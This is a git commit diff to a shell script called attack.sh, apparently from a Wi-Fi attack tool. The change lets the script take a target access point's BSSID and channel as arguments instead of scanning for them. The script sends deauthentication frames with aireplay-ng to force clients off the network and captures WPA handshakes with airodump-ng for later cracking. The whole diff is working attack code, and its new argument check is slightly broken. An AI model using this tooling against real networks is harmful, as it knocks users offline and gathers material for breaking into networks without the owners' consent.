b0d627069597b2aec10153cba613213456ec8e15
isa <58566654+rinamuka@users.noreply.github.com>
2022-03-28 11:36:46 +0000

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -108,31 +108,17 @@ attackSpecific(){
            trap 'cleanup;' EXIT
            airmon-ng start $interface >/dev/null
            BSSID_SEARCH=$1
-           timeout 20 airodump-ng -w ./hscollector/shakesCollector $interface </dev/null >/dev/null 
-           while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
-                  if [[ $BSSID == "BSSID" ]];then
-                          continue
-                  fi
-                  
-                  if [[ $BSSID == $BSSID_SEARCH ]]
-                  then
-                          printf "\033[32mFind this AP\033[0m\n"
-                          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
-                          iwconfig $interface channel $Channel
-                          aireplay-ng -a $BSSID -0 10 $interface &
-                          airodump-ng --bssid $BSSID --channel $Channel -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
-                          airodumpPID=`echo $!`
-                          sleep 30
-                          echo "airodumpPID:"$airodumpPID
-                          kill -9 $airodumpPID
-                          checkHandshakes
-                          break
-                  else
-                        continue
-                  fi                 
-                  printf "\033[31mNo this AP\033[0m\n"
+           CHANNEL=$2
+           echo "CHannel:" $CHANNEL "BSSID:" $BSSID_SEARCH
+          iwconfig $interface channel $CHANNEL
+          aireplay-ng -a $BSSID_SEARCH -0 10 $interface &
+          airodump-ng --bssid $BSSID_SEARCH --channel $CHANNEL -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
+          airodumpPID=`echo $!`
+          sleep 30
+          echo "airodumpPID:"$airodumpPID
+          kill -9 $airodumpPID
+          checkHandshakes
 
-            done < ./hscollector/shakesCollector-01.kismet.csv
             cleanup
             #rm ./hscollector/shakesCollector* &>/dev/null
             #rm ./hscollector/shakes* &>/dev/null
@@ -183,10 +169,15 @@ if [[ $1 != "" ]] && [[ $2 != "" ]];then
                                 echo "Enter BSSID of AP"
                                 exit 1
                         fi
-                        attackSpecific $3 $channel
-                fi
-                
-                exit 0
+                        if [[ $4 == "" ]];then
+                                channel=$4
+                                echo "Enter channel of AP"
+                                exit 1
+                        fi
 
+                        echo "BSSID:" $3 " Channel: "$channel
+                        attackSpecific $3 $4 
+                fi
+                exit 0
 fi
 main 
